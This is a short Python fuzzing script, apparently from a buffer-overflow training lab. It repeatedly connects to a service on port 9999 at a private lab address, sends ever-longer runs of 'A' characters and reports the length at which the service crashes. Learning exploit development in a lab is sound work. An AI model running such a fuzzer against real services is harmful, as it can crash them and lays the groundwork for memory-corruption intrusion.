#!/usr/bin/python

import socket, sys
from time import sleep

buffer = "A" * 100

while True:
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect(('192.168.56.106', 9999))
		s.send('string' + buffer)
		sleep(1)

		buffer = buffer + 'A' * 100

	except:
		print("Fuzzing crashed at: ",len(buffer))
		sys.exit()